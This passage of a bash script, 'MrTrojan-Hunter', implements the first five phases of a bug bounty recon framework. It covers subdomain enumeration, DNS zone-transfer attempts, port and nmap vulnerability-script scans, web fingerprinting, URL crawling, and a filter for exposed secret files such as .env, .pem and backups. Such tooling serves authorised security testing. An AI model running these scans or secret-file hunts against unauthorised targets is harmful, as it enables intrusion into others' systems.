#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════════════╗
#  MrTrojan-Hunter v1.0  — Full-Spectrum Bug Bounty & Recon Framework
#  Author  : MrTrojan
#  Usage   : ./mrtrojan-hunter.sh -d target.com [OPTIONS]
#  GitHub  : https://github.com/mrtrojan/mrtrojan-hunter
# ╚══════════════════════════════════════════════════════════════════════════╝
#
#  MODULES (21 phases):
#   01 Subdomain Enumeration    02 DNS & ASN Intel
#   03 Port Scanning            04 Web Probing & Tech Detection
#   05 URL Crawling             06 Parameter Discovery
#   07 Directory Brute-Force    08 JavaScript Analysis
#   09 SQL Injection            10 Cross-Site Scripting (XSS)
#   11 Local File Inclusion     12 Server-Side Request Forgery
#   13 Open Redirect            14 CORS Misconfiguration
#   15 Subdomain Takeover       16 Nuclei Broad Scan
#   17 Secrets & Credentials    18 Cloud Infrastructure
#   19 WordPress Security       20 Additional Checks
#   21 Final Report
#
#  SMART EXECUTION:
#   - Tools run to natural completion — no findings are cut short
#   - Stall detection kills only frozen/hung processes (zero output)
#   - Passive subdomain tools run in parallel to save time
#   - Every phase gracefully skips missing tools
# ─────────────────────────────────────────────────────────────────────────────

# NOTE: No set -e — errors handled per-command with || true
# so a missing tool never kills the whole run.
set -uo pipefail
IFS=$'\n\t'

# ─────────────────────────────────────────────
#  COLORS & FORMATTING
# ─────────────────────────────────────────────
RED='\033[0;31m';  GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m';  MAGENTA='\033[0;35m'
BOLD='\033[1m';    DIM='\033[2m';      RESET='\033[0m'

banner() {
cat << 'BANNER'

  ███╗   ███╗██████╗ ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗
  ████╗ ████║██╔══██╗╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║
  ██╔████╔██║██████╔╝   ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║
  ██║╚██╔╝██║██╔══██╗   ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║
  ██║ ╚═╝ ██║██║  ██║   ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║
  ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝

  ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
  ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
  ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
  ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
  ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

         v1.0  |  Full-Spectrum Bug Bounty Framework  |  by MrTrojan
BANNER
}

# ─────────────────────────────────────────────
#  LOGGING HELPERS
# ─────────────────────────────────────────────
LOGFILE="/dev/null"   # overwritten after setup_dirs()

_log() { echo -e "$1" | tee -a "$LOGFILE"; }

log_phase()  {
  _log ""
  _log "${BOLD}${MAGENTA}╔══════════════════════════════════════════════════════════════╗${RESET}"
  _log "${BOLD}${MAGENTA}║${RESET}  ${BOLD}${CYAN}$1${RESET}"
  _log "${BOLD}${MAGENTA}╚══════════════════════════════════════════════════════════════╝${RESET}"
}
log_module() { _log "  ${CYAN}[MOD]${RESET}  $1"; }
log_ok()     { _log "  ${GREEN}[+]${RESET}    $1"; }
log_warn()   { _log "  ${YELLOW}[!]${RESET}    $1"; }
log_err()    { _log "  ${RED}[-]${RESET}    $1"; }
log_info()   { _log "  ${DIM}[~]${RESET}    $1"; }
log_vuln()   { _log "  ${RED}${BOLD}[VULN]${RESET} ${RED}$1${RESET}"; }
log_skip()   { _log "  ${DIM}[SKIP]${RESET} $1 (tool not found)"; }
log_hunter() { _log "  ${MAGENTA}${BOLD}[MrTrojan]${RESET} $1"; }

separator()  { _log "${DIM}──────────────────────────────────────────────────────────────${RESET}"; }

# ─────────────────────────────────────────────
#  CONFIGURATION & DEFAULTS
# ─────────────────────────────────────────────
DOMAIN=""
OUTPUT_DIR=""
THREADS=50
RATE_LIMIT=100
WORDLIST_DIR="/usr/share/seclists"
NUCLEI_TEMPLATES="$HOME/nuclei-templates"
GITHUB_TOKEN=""
VIRUSTOTAL_KEY=""
SHODAN_KEY=""
BURP_COLLABORATOR=""
BXSS_ENDPOINT=""

RUN_SUBDOMAIN=true
RUN_DNS=true
RUN_PORTSCAN=true
RUN_WEBPROBE=true
RUN_CRAWL=true
RUN_PARAMS=true
RUN_DIRSCAN=true
RUN_JS=true
RUN_SQLI=true
RUN_XSS=true
RUN_LFI=true
RUN_SSRF=true
RUN_REDIRECT=true
RUN_CORS=true
RUN_TAKEOVER=true
RUN_NUCLEI=true
RUN_SECRETS=true
RUN_TECH=true
RUN_CLOUD=true
RUN_WORDPRES=true
RUN_REPORT=true
RUN_OWASP=true

VERBOSE=false
DEEP_SCAN=false

# ─────────────────────────────────────────────
#  ARGUMENT PARSING
# ─────────────────────────────────────────────
usage() {
cat << EOF
${BOLD}${MAGENTA}
  MrTrojan-Hunter v1.0 — Full-Spectrum Bug Bounty Framework
${RESET}
${BOLD}Usage:${RESET}
  $0 -d target.com [OPTIONS]

${BOLD}Required:${RESET}
  -d, --domain          Target domain

${BOLD}Output:${RESET}
  -o, --output          Output directory (default: ./mth_<domain>_<date>)

${BOLD}API Keys:${RESET}
  --github-token        GitHub API token
  --vt-key              VirusTotal API key
  --shodan-key          Shodan API key
  --collaborator        Burp Collaborator / OAST URL (for blind SSRF/XSS)
  --bxss                Blind XSS endpoint

${BOLD}Tuning:${RESET}
  -t, --threads         Threads (default: 50)
  -r, --rate            Rate limit req/s (default: 100)
  -w, --wordlist-dir    SecLists base dir (default: /usr/share/seclists)
  --nuclei-templates    Nuclei templates dir (default: ~/nuclei-templates)
  --stall-timeout       Seconds of zero output before killing a stalled tool (default: 120)
  --deep                Enable deep/slow scans
  -v, --verbose         Verbose output

${BOLD}Skip Flags:${RESET}
  --skip-subdomain  --skip-dns       --skip-portscan  --skip-webprobe
  --skip-crawl      --skip-params    --skip-dirscan   --skip-js
  --skip-sqli       --skip-xss       --skip-lfi       --skip-ssrf
  --skip-redirect   --skip-cors      --skip-takeover  --skip-nuclei
  --skip-secrets    --skip-tech      --skip-cloud     --skip-wordpress
  --skip-report     --skip-owasp

${BOLD}Examples:${RESET}
  $0 -d example.com --github-token ghp_xxx --vt-key abc123
  $0 -d example.com --skip-portscan --skip-dns
  $0 -d example.com --deep -t 100
  $0 -d example.com --stall-timeout 60

${BOLD}${MAGENTA}  Happy Hunting!  — MrTrojan${RESET}
EOF
exit 0
}

parse_args() {
  [[ $# -eq 0 ]] && usage
  while [[ $# -gt 0 ]]; do
    case "$1" in
      -d|--domain)           DOMAIN="$2";                shift 2 ;;
      -o|--output)           OUTPUT_DIR="$2";            shift 2 ;;
      --github-token)        GITHUB_TOKEN="$2";          shift 2 ;;
      --vt-key)              VIRUSTOTAL_KEY="$2";        shift 2 ;;
      --shodan-key)          SHODAN_KEY="$2";            shift 2 ;;
      --collaborator)        BURP_COLLABORATOR="$2";     shift 2 ;;
      --bxss)                BXSS_ENDPOINT="$2";         shift 2 ;;
      -t|--threads)          THREADS="$2";               shift 2 ;;
      -r|--rate)             RATE_LIMIT="$2";            shift 2 ;;
      -w|--wordlist-dir)     WORDLIST_DIR="$2";          shift 2 ;;
      --nuclei-templates)    NUCLEI_TEMPLATES="$2";      shift 2 ;;
      --stall-timeout)       STALL_TIMEOUT="$2";         shift 2 ;;
      --deep)                DEEP_SCAN=true;             shift ;;
      -v|--verbose)          VERBOSE=true;               shift ;;
      --skip-subdomain)      RUN_SUBDOMAIN=false;        shift ;;
      --skip-dns)            RUN_DNS=false;              shift ;;
      --skip-portscan)       RUN_PORTSCAN=false;         shift ;;
      --skip-webprobe)       RUN_WEBPROBE=false;         shift ;;
      --skip-crawl)          RUN_CRAWL=false;            shift ;;
      --skip-params)         RUN_PARAMS=false;           shift ;;
      --skip-dirscan)        RUN_DIRSCAN=false;          shift ;;
      --skip-js)             RUN_JS=false;               shift ;;
      --skip-sqli)           RUN_SQLI=false;             shift ;;
      --skip-xss)            RUN_XSS=false;              shift ;;
      --skip-lfi)            RUN_LFI=false;              shift ;;
      --skip-ssrf)           RUN_SSRF=false;             shift ;;
      --skip-redirect)       RUN_REDIRECT=false;         shift ;;
      --skip-cors)           RUN_CORS=false;             shift ;;
      --skip-takeover)       RUN_TAKEOVER=false;         shift ;;
      --skip-nuclei)         RUN_NUCLEI=false;           shift ;;
      --skip-secrets)        RUN_SECRETS=false;          shift ;;
      --skip-tech)           RUN_TECH=false;             shift ;;
      --skip-cloud)          RUN_CLOUD=false;            shift ;;
      --skip-wordpress)      RUN_WORDPRES=false;         shift ;;
      --skip-report)         RUN_REPORT=false;           shift ;;
      -h|--help)             usage ;;
      *) log_err "Unknown option: $1"; usage ;;
    esac
  done
  [[ -z "$DOMAIN" ]] && {
    echo -e "${RED}[-] Domain is required. Use -d target.com${RESET}"
    exit 1
  }
}

# ─────────────────────────────────────────────
#  TOOL CHECK  (non-fatal)
# ─────────────────────────────────────────────
tool_ok() { command -v "$1" &>/dev/null; }

# ─────────────────────────────────────────────
#  DEPENDENCY CHECK
# ─────────────────────────────────────────────
check_dependencies() {
  log_phase "MrTrojan-Hunter — Tool Dependency Check"
  local tools=(
    subfinder assetfinder findomain amass dnsx
    httpx httprobe
    katana hakrawler gau
    naabu nmap
    ffuf dirsearch arjun
    gf qsreplace dalfox Gxss kxss
    nuclei
    subzy
    wpscan
    curl jq dig sort awk sed grep tee xargs cut tr
    gowitness
  )
  local missing=()
  local found=0
  for t in "${tools[@]}"; do
    if tool_ok "$t"; then
      log_ok "$t"
      (( found++ )) || true
    else
      log_warn "MISSING (optional): $t"
      missing+=("$t")
    fi
  done
  separator
  log_hunter "$found/${#tools[@]} tools available"
  [[ ${#missing[@]} -gt 0 ]] && \
    log_warn "${#missing[@]} tool(s) missing — modules will be skipped gracefully"
  log_ok "Dependency check complete"
}

# ─────────────────────────────────────────────
#  DIRECTORY SETUP
# ─────────────────────────────────────────────
setup_dirs() {
  local date_str; date_str=$(date +%Y%m%d_%H%M%S)
  [[ -z "$OUTPUT_DIR" ]] && OUTPUT_DIR="./mth_${DOMAIN}_${date_str}"

  for _d in 00_meta 01_subdomains 02_dns 03_portscan 04_webprobe \
            05_crawl 06_params 07_dirscan 08_javascript 09_sqli \
            10_xss 11_lfi 12_ssrf 13_redirect 14_cors 15_takeover \
            16_nuclei 17_secrets 19_cloud 20_wordpress 99_report; do
    mkdir -p "$OUTPUT_DIR/$_d"
  done

  LOGFILE="$OUTPUT_DIR/00_meta/mrtrojan-hunter.log"
  log_ok "Output directory : $OUTPUT_DIR"
  log_ok "Log file         : $LOGFILE"
}

# ─────────────────────────────────────────────
#  SMART RUN HELPERS
#
#  run_cmd   — foreground, streams live output, stall-detection only
#  run_bg    — background parallel launch
#  wait_bg   — wait for all bg jobs, stall-detection per job
#
#  STALL_TIMEOUT: if a tool writes NOTHING for this many seconds it is
#  considered frozen and killed. Tools actively producing output run
#  to natural completion — zero findings are ever cut short.
# ─────────────────────────────────────────────
STALL_TIMEOUT=120

declare -a BG_PIDS=()
declare -a BG_DESCS=()
declare -a BG_LOGS=()

run_cmd() {
  local desc="$1"; shift
  log_module "$desc"

  local tmp_out; tmp_out=$(mktemp)
  local last_size=0
  local stall_secs=0
  local check_interval=5

  "$@" >> "$tmp_out" 2>&1 &
  local pid=$!

  while kill -0 "$pid" 2>/dev/null; do
    sleep "$check_interval"
    local cur_size; cur_size=$(wc -c < "$tmp_out" 2>/dev/null || echo 0)
    if [[ "$cur_size" -gt "$last_size" ]]; then
      tail -c +"$((last_size + 1))" "$tmp_out" | tee -a "$LOGFILE"
      last_size=$cur_size
      stall_secs=0
    else
      stall_secs=$(( stall_secs + check_interval ))
      if [[ $stall_secs -ge $STALL_TIMEOUT ]]; then
        log_warn "STALL (${STALL_TIMEOUT}s no output) — killing: $desc"
        kill "$pid" 2>/dev/null
        wait "$pid" 2>/dev/null
        break
      fi
    fi
  done
  wait "$pid" 2>/dev/null

  local cur_size; cur_size=$(wc -c < "$tmp_out" 2>/dev/null || echo 0)
  if [[ "$cur_size" -gt "$last_size" ]]; then
    tail -c +"$((last_size + 1))" "$tmp_out" | tee -a "$LOGFILE"
  fi
  rm -f "$tmp_out"
  return 0
}

run_bg() {
  local desc="$1"; shift
  local outfile="$1"; shift
  log_module "[PARALLEL] $desc"
  "$@" >> "$outfile" 2>&1 &
  local pid=$!
  BG_PIDS+=("$pid")
  BG_DESCS+=("$desc")
  BG_LOGS+=("$outfile")
}

wait_bg() {
  [[ ${#BG_PIDS[@]} -eq 0 ]] && return 0
  log_hunter "Waiting for ${#BG_PIDS[@]} parallel job(s) to finish..."
  local i
  for i in "${!BG_PIDS[@]}"; do
    local pid="${BG_PIDS[$i]}"
    local desc="${BG_DESCS[$i]}"
    local stall_secs=0
    local last_size=0
    local check_interval=10

    while kill -0 "$pid" 2>/dev/null; do
      sleep "$check_interval"
      local cur_size; cur_size=$(wc -c < "${BG_LOGS[$i]}" 2>/dev/null || echo 0)
      if [[ "$cur_size" -gt "$last_size" ]]; then
        last_size=$cur_size
        stall_secs=0
      else
        stall_secs=$(( stall_secs + check_interval ))
        if [[ $stall_secs -ge $STALL_TIMEOUT ]]; then
          log_warn "STALL (${STALL_TIMEOUT}s) in parallel job — killing: $desc"
          kill "$pid" 2>/dev/null
          break
        fi
      fi
    done
    wait "$pid" 2>/dev/null
    [[ -s "${BG_LOGS[$i]}" ]] && tee -a "$LOGFILE" < "${BG_LOGS[$i]}" > /dev/null
    log_ok "Finished [PARALLEL]: $desc"
  done
  BG_PIDS=()
  BG_DESCS=()
  BG_LOGS=()
}

# ─────────────────────────────────────────────
#  PHASE 1 — SUBDOMAIN ENUMERATION
# ─────────────────────────────────────────────
phase_subdomains() {
  $RUN_SUBDOMAIN || { log_info "Subdomain phase skipped (--skip-subdomain)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 01 — Subdomain Enumeration"
  local OUT="$OUTPUT_DIR/01_subdomains"

  # ── Run all passive subdomain tools IN PARALLEL ──────────────────────────────
  # Tools write directly to their own output files.
  # Stall detection (STALL_TIMEOUT) kills any tool that freezes with zero output.
  # Tools that ARE producing results run to natural completion — no findings lost.

  if tool_ok subfinder; then
    run_bg "subfinder (passive + recursive)" "$OUT/subfinder.txt" \
      subfinder -d "$DOMAIN" -all -recursive -silent
  else log_skip "subfinder"; fi

  if tool_ok assetfinder; then
    run_bg "assetfinder" "$OUT/assetfinder.txt" \
      bash -c "assetfinder --subs-only '$DOMAIN'"
  else log_skip "assetfinder"; fi

  if tool_ok findomain; then
    run_bg "findomain" "$OUT/findomain.txt" \
      bash -c "findomain -t '$DOMAIN' -q 2>/dev/null"
  else log_skip "findomain"; fi

  if tool_ok amass; then
    run_bg "amass (passive — full run, stall-guarded)" "$OUT/amass_passive.txt" \
      bash -c "amass enum -passive -d '$DOMAIN' 2>/dev/null | sort -u"
    if $DEEP_SCAN; then
      run_bg "amass (active — full run, stall-guarded)" "$OUT/amass_active.txt" \
        bash -c "amass enum -active -d '$DOMAIN' 2>/dev/null | sort -u"
    fi
  else log_skip "amass"; fi

  # ── Wait for ALL parallel subdomain jobs to finish before merging ─────────
  wait_bg

  # crt.sh — pure curl, always available
  log_module "crt.sh certificate transparency"
  curl -s "https://crt.sh?q=${DOMAIN}&output=json" 2>/dev/null \
    | jq -r '.[].name_value' 2>/dev/null \
    | grep -Po '(\w[\w.-]+\.\w+)' \
    | sort -u > "$OUT/crtsh.txt" || true
  log_ok "crt.sh: $(wc -l < "$OUT/crtsh.txt") entries"

  # Wayback subdomains — pure curl
  log_module "Wayback Machine subdomains"
  curl -s "http://web.archive.org/cdx/search/cdx?url=*.${DOMAIN}/*&output=text&fl=original&collapse=urlkey" \
    2>/dev/null \
    | sed -e 's_https*://__' -e 's/\/.*//' -e 's/:.*//' -e 's/^www\.//' \
    | grep -F "$DOMAIN" \
    | sort -u > "$OUT/wayback_subs.txt" || true

  # VirusTotal (key required)
  if [[ -n "$VIRUSTOTAL_KEY" ]]; then
    log_module "VirusTotal subdomains"
    curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=${VIRUSTOTAL_KEY}&domain=${DOMAIN}" \
      2>/dev/null \
      | jq -r '.subdomains[]? // .domain_siblings[]?' 2>/dev/null \
      | sort -u > "$OUT/virustotal.txt" || true
  fi

  # GitHub subdomains (key required)
  if tool_ok github-subdomains && [[ -n "$GITHUB_TOKEN" ]]; then
    run_cmd "GitHub subdomain scraping" \
      bash -c "github-subdomains -d '$DOMAIN' -t '$GITHUB_TOKEN' 2>/dev/null \
        | sort -u > '$OUT/github_subs.txt'"
  fi

  # Shodan cert lookup (key required)
  if [[ -n "$SHODAN_KEY" ]]; then
    log_module "Shodan SSL cert subdomains"
    curl -s "https://api.shodan.io/dns/domain/${DOMAIN}?key=${SHODAN_KEY}" 2>/dev/null \
      | jq -r '.subdomains[]?' 2>/dev/null \
      | awk -v d=".${DOMAIN}" '{print $0 d}' \
      | sort -u > "$OUT/shodan_subs.txt" || true
  fi

  # Merge & deduplicate
  log_module "Merging & deduplicating all subdomain sources"
  cat "$OUT"/*.txt 2>/dev/null | grep -F "$DOMAIN" | sort -u > "$OUT/all_subdomains.txt" || true
  local count; count=$(wc -l < "$OUT/all_subdomains.txt" 2>/dev/null || echo 0)
  log_ok "Total unique subdomains: $count → $OUT/all_subdomains.txt"

  # DNS resolution
  if tool_ok dnsx; then
    run_cmd "DNS resolution with dnsx" \
      bash -c "dnsx -l '$OUT/all_subdomains.txt' -silent -a -aaaa -cname -mx -resp \
        -o '$OUT/dns_resolved.txt' 2>/dev/null"
    log_ok "Resolved → $OUT/dns_resolved.txt"
  else log_skip "dnsx"; fi

  # Subdomain permutation (subfinder-native, no alterx needed)
  if tool_ok subfinder && tool_ok dnsx && $DEEP_SCAN; then
    run_cmd "Subdomain permutation via subfinder -active" \
      bash -c "subfinder -d '$DOMAIN' -active -silent 2>/dev/null \
        | sort -u > '$OUT/subfinder_active.txt'"
    cat "$OUT/subfinder_active.txt" >> "$OUT/all_subdomains.txt" 2>/dev/null || true
    sort -u "$OUT/all_subdomains.txt" -o "$OUT/all_subdomains.txt" 2>/dev/null || true
  fi

  # FFUF subdomain brute-force (deep only)
  if tool_ok ffuf && $DEEP_SCAN; then
    local wl="${WORDLIST_DIR}/Discovery/DNS/subdomains-top1million-5000.txt"
    if [[ -f "$wl" ]]; then
      run_cmd "FFUF subdomain brute-force" \
        bash -c "ffuf -u 'https://FUZZ.${DOMAIN}' -w '$wl' \
          -mc 200,301,302 -silent -o '$OUT/ffuf_subs.json' -of json 2>/dev/null"
    else
      log_warn "FFUF wordlist not found: $wl"
    fi
  fi
}

# ─────────────────────────────────────────────
#  PHASE 2 — DNS & ASN INTELLIGENCE
# ─────────────────────────────────────────────
phase_dns() {
  $RUN_DNS || { log_info "DNS phase skipped (--skip-dns)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 02 — DNS & ASN Intelligence"
  local OUT="$OUTPUT_DIR/02_dns"

  # IP + ASN lookup via dig + ipinfo.io API (no binary needed)
  log_module "IP & ASN resolution"
  local main_ip
  main_ip=$(dig +short "$DOMAIN" 2>/dev/null | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1 || true)
  echo "${main_ip:-unknown}" > "$OUT/main_ip.txt"
  log_info "Main IP: ${main_ip:-not resolved}"

  if [[ -n "${main_ip:-}" ]]; then
    log_module "ipinfo.io API lookup"
    curl -s "https://ipinfo.io/${main_ip}/json" 2>/dev/null > "$OUT/ipinfo.txt" || true
    log_ok "ipinfo saved → $OUT/ipinfo.txt"

    run_cmd "ASN / CIDR lookup via HackerTarget" \
      bash -c "curl -s 'https://api.hackertarget.com/aslookup/?q=${main_ip}' 2>/dev/null \
        > '$OUT/asn_info.txt'"
    local asn
    asn=$(grep -oP 'AS\d+' "$OUT/asn_info.txt" 2>/dev/null | head -1 || true)
    if [[ -n "${asn:-}" ]]; then
      log_info "ASN: $asn"
      run_cmd "ASN → IP ranges" \
        bash -c "curl -s 'https://api.hackertarget.com/aslookup/?q=${asn}' 2>/dev/null \
          > '$OUT/asn_ip_ranges.txt'"
    fi
  fi

  if tool_ok amass; then
    run_cmd "amass intel (org discovery — full run, stall-guarded)" \
      bash -c "amass intel -org '$DOMAIN' 2>/dev/null | sort -u > '$OUT/amass_intel_org.txt'"
  else log_skip "amass"; fi

  # IP harvesting from public APIs
  log_module "IP harvesting from OTX / URLScan"
  curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/${DOMAIN}/url_list?limit=500" \
    2>/dev/null \
    | jq -r '.url_list[]?.result?.urlworker?.ip // empty' 2>/dev/null \
    | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' \
    | sort -u >> "$OUT/harvested_ips.txt" || true

  curl -s "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=1000" 2>/dev/null \
    | jq -r '.results[]?.page?.ip // empty' 2>/dev/null \
    | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' \
    | sort -u >> "$OUT/harvested_ips.txt" || true

  sort -u "$OUT/harvested_ips.txt" -o "$OUT/harvested_ips.txt" 2>/dev/null || true
  log_ok "Harvested IPs → $OUT/harvested_ips.txt"

  # Reverse DNS
  if [[ -s "$OUT/harvested_ips.txt" ]]; then
    log_module "Reverse DNS on harvested IPs"
    while IFS= read -r ip; do
      host "$ip" 2>/dev/null | grep "domain name pointer" >> "$OUT/reverse_dns.txt" || true
    done < "$OUT/harvested_ips.txt"
  fi

  # Zone transfer attempt
  log_module "DNS zone transfer attempt"
  for ns in $(dig NS "$DOMAIN" +short 2>/dev/null); do
    dig axfr "@$ns" "$DOMAIN" 2>/dev/null >> "$OUT/zone_transfer.txt" || true
  done

  # Email security records
  log_module "SPF / DMARC / DKIM checks"
  {
    echo "=== SPF ===";   dig TXT "$DOMAIN" +short 2>/dev/null | grep -i "spf" || echo "Not found"
    echo "=== DMARC ==="; dig TXT "_dmarc.$DOMAIN" +short 2>/dev/null || echo "Not found"
    echo "=== DKIM ===";  dig TXT "default._domainkey.$DOMAIN" +short 2>/dev/null || echo "Not found"
  } > "$OUT/email_security.txt"
  log_ok "Email security → $OUT/email_security.txt"
}

# ─────────────────────────────────────────────
#  PHASE 3 — PORT SCANNING
# ─────────────────────────────────────────────
phase_portscan() {
  $RUN_PORTSCAN || { log_info "Port scan skipped (--skip-portscan)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 03 — Port Scanning"
  local OUT="$OUTPUT_DIR/03_portscan"
  local SUBS="$OUTPUT_DIR/01_subdomains/all_subdomains.txt"

  if [[ ! -f "$SUBS" || ! -s "$SUBS" ]]; then
    log_warn "No subdomain list found — skipping port scan"
    return 0
  fi

  if tool_ok naabu; then
    run_cmd "naabu (top-1000 ports)" \
      bash -c "naabu -list '$SUBS' -top-ports 1000 -silent \
        -o '$OUT/naabu_top1000.txt' 2>/dev/null"
    log_ok "naabu results → $OUT/naabu_top1000.txt"

    if $DEEP_SCAN && tool_ok nmap; then
      run_cmd "naabu + nmap service detection" \
        bash -c "naabu -list '$SUBS' -p - -c 50 -silent \
          -nmap-cli 'nmap -sV --script=banner,http-title,ssl-enum-ciphers' \
          -o '$OUT/naabu_full.txt' 2>/dev/null"
    fi
  else log_skip "naabu"; fi

  if tool_ok nmap && $DEEP_SCAN; then
    run_cmd "nmap full service scan" \
      bash -c "nmap -p- --min-rate 1000 -T4 -A '$DOMAIN' \
        -oA '$OUT/nmap_full' 2>/dev/null"
    run_cmd "nmap vuln scripts" \
      bash -c "nmap --script=vuln -p 80,443,8080,8443 '$DOMAIN' \
        -oA '$OUT/nmap_vuln' 2>/dev/null"
  fi
}

# ─────────────────────────────────────────────
#  PHASE 4 — WEB PROBING & TECH DETECTION
# ─────────────────────────────────────────────
phase_webprobe() {
  $RUN_WEBPROBE || { log_info "Web probe skipped (--skip-webprobe)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 04 — Web Probing & Technology Detection"
  local OUT="$OUTPUT_DIR/04_webprobe"
  local SUBS="$OUTPUT_DIR/01_subdomains/all_subdomains.txt"

  if [[ ! -f "$SUBS" || ! -s "$SUBS" ]]; then
    log_warn "No subdomain list — skipping web probe"
    return 0
  fi

  if tool_ok httpx; then
    run_cmd "httpx web probe (multi-port)" \
      bash -c "httpx -l '$SUBS' \
        -ports 80,443,8080,8000,8888,8443,8081,3000,5000,9090,9443 \
        -threads $THREADS -silent \
        -title -status-code -tech-detect -content-length -web-server \
        -o '$OUT/alive_full.txt' 2>/dev/null"
    awk '{print $1}' "$OUT/alive_full.txt" 2>/dev/null | sort -u > "$OUT/alive_urls.txt" || true
    local count; count=$(wc -l < "$OUT/alive_urls.txt" 2>/dev/null || echo 0)
    log_ok "Live web targets: $count → $OUT/alive_urls.txt"
  else log_skip "httpx"; fi

  # httprobe fallback
  if tool_ok httprobe && [[ ! -s "$OUT/alive_urls.txt" ]]; then
    run_cmd "httprobe (fallback)" \
      bash -c "cat '$SUBS' | httprobe | sort -u > '$OUT/alive_urls.txt'"
  fi

  # Technology stack JSON
  if $RUN_TECH && tool_ok httpx && [[ -s "$OUT/alive_urls.txt" ]]; then
    run_cmd "Technology stack fingerprint" \
      bash -c "httpx -l '$OUT/alive_urls.txt' -tech-detect -silent -json \
        -o '$OUT/tech_stack.json' 2>/dev/null"
    log_ok "Tech stack → $OUT/tech_stack.json"
  fi

  # Screenshots — gowitness (aquatone successor)
  if tool_ok gowitness && [[ -s "$OUT/alive_urls.txt" ]]; then
    run_cmd "gowitness screenshots" \
      bash -c "gowitness file -f '$OUT/alive_urls.txt' \
        --screenshot-path '$OUT/screenshots' 2>/dev/null"
    log_ok "Screenshots → $OUT/screenshots/"
  fi

  # WAF detection (inline, no external tool needed)
  if [[ -s "$OUT/alive_urls.txt" ]]; then
    log_module "WAF detection"
    while IFS= read -r url; do
      local waf
      waf=$(curl -sI "$url" 2>/dev/null \
        | grep -iE "x-sucuri|x-fw|cloudflare|akamai|incapsula|mod_security" || true)
      [[ -n "$waf" ]] && echo "$url => $waf" >> "$OUT/waf_detected.txt"
    done < "$OUT/alive_urls.txt" || true
    log_ok "WAF check done → $OUT/waf_detected.txt"
  fi
}

# ─────────────────────────────────────────────
#  PHASE 5 — URL CRAWLING & COLLECTION
# ─────────────────────────────────────────────
phase_crawl() {
  $RUN_CRAWL || { log_info "Crawl skipped (--skip-crawl)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 05 — URL Crawling & Collection"
  local OUT="$OUTPUT_DIR/05_crawl"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"

  if [[ ! -f "$ALIVE" || ! -s "$ALIVE" ]]; then
    log_warn "No alive URLs — skipping crawl"
    return 0
  fi

  if tool_ok katana; then
    local depth=2; $DEEP_SCAN && depth=4
    run_cmd "katana active crawl (depth $depth)" \
      bash -c "katana -list '$ALIVE' -d $depth -jc -silent \
        -o '$OUT/katana_urls.txt' 2>/dev/null"
  else log_skip "katana"; fi

  if tool_ok hakrawler && [[ -s "$OUT/katana_urls.txt" ]]; then
    run_cmd "hakrawler (JS + links)" \
      bash -c "cat '$OUT/katana_urls.txt' | hakrawler -u 2>/dev/null \
        | sort -u > '$OUT/hakrawler_urls.txt'"
  else log_skip "hakrawler"; fi

  if tool_ok gau; then
    run_cmd "gau passive URL collection" \
      bash -c "echo '$DOMAIN' \
        | gau --mc 200,301,302,403 --threads $THREADS 2>/dev/null \
        | sort -u > '$OUT/gau_urls.txt'"
  else log_skip "gau"; fi

  # Wayback URLs — pure curl
  log_module "Wayback Machine URL harvest"
  curl -s "http://web.archive.org/cdx/search/cdx?url=*.${DOMAIN}/*&output=text&fl=original&collapse=urlkey&limit=50000" \
    2>/dev/null | sort -u > "$OUT/wayback_urls.txt" || true
  log_ok "Wayback: $(wc -l < "$OUT/wayback_urls.txt") URLs"

  # Merge all URLs
  log_module "Merging all crawled URLs"
  cat "$OUT"/*.txt 2>/dev/null | grep -v "^$" | sort -u > "$OUT/all_urls.txt" || true
  local count; count=$(wc -l < "$OUT/all_urls.txt" 2>/dev/null || echo 0)
  log_ok "Total unique URLs: $count → $OUT/all_urls.txt"

  # Sensitive file extensions
  log_module "Filtering sensitive file URLs"
  grep -iE "\.(xls|xlsx|xml|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|env|ini|conf|properties|pem|key|crt|sh|py|java|sql|sqlite3|git)($|\?)" \
    "$OUT/all_urls.txt" 2>/dev/null | sort -u > "$OUT/sensitive_files.txt" || true
  log_ok "Sensitive file URLs: $(wc -l < "$OUT/sensitive_files.txt") → $OUT/sensitive_files.txt"

  # Dynamic pages
  grep -iE "\.(php|asp|aspx|jsp|jspx|cfm|pl|cgi)(\?|$)" \
    "$OUT/all_urls.txt" 2>/dev/null | sort -u > "$OUT/dynamic_pages.txt" || true
}

# ─────────────────────────────────────────────
#  PHASE 6 — PARAMETER DISCOVERY
# ─────────────────────────────────────────────
phase_params() {
  $RUN_PARAMS || { log_info "Param discovery skipped (--skip-params)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 06 — Parameter Discovery"
